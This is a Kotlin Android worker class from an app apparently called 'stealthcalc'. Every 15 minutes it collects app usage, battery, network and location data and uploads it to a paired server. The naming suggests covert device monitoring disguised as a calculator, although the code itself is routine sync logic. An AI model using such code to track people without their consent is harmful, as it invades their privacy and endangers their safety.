package com.stealthcalc.monitoring.service

import android.content.Context
import androidx.hilt.work.HiltWorker
import androidx.work.CoroutineWorker
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.WorkerParameters
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.collector.AppUsageCollector
import com.stealthcalc.monitoring.collector.BatteryCollector
import com.stealthcalc.monitoring.collector.LocationCollector
import com.stealthcalc.monitoring.collector.NetworkCollector
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.assisted.Assisted
import dagger.assisted.AssistedInject
import java.util.concurrent.TimeUnit

@HiltWorker
class AgentSyncWorker @AssistedInject constructor(
    @Assisted context: Context,
    @Assisted params: WorkerParameters,
    private val repository: MonitoringRepository,
    private val appUsageCollector: AppUsageCollector,
    private val batteryCollector: BatteryCollector,
    private val networkCollector: NetworkCollector,
    private val locationCollector: LocationCollector,
    private val apiClient: AgentApiClient,
) : CoroutineWorker(context, params) {

    companion object {
        private const val WORK_NAME = "agent_sync"

        fun schedule(context: Context) {
            val request = PeriodicWorkRequestBuilder<AgentSyncWorker>(15, TimeUnit.MINUTES)
                .build()
            WorkManager.getInstance(context).enqueueUniquePeriodicWork(
                WORK_NAME,
                ExistingPeriodicWorkPolicy.KEEP,
                request,
            )
        }

        fun cancel(context: Context) {
            WorkManager.getInstance(context).cancelUniqueWork(WORK_NAME)
        }
    }

    override suspend fun doWork(): Result {
        if (!repository.isAgent) return Result.success()

        runCatching {
            appUsageCollector.collect()
            batteryCollector.collect()
            networkCollector.collectSnapshot()
            locationCollector.collect()
        }.onFailure { e ->
            AppLogger.log(applicationContext, "[agent]", "Worker collection error: ${e.message}")
        }

        runCatching {
            val unsent = repository.getUnsent()
            if (unsent.isNotEmpty() && repository.isPaired) {
                val success = apiClient.uploadBatch(unsent)
                if (success) {
                    repository.markUploaded(unsent.map { it.id })
                    repository.setLastSync(System.currentTimeMillis())
                }
            }
            repository.pruneOldEvents()
        }.onFailure { e ->
            AppLogger.log(applicationContext, "[agent]", "Worker upload error: ${e.message}")
            return Result.retry()
        }

        return Result.success()
    }
}
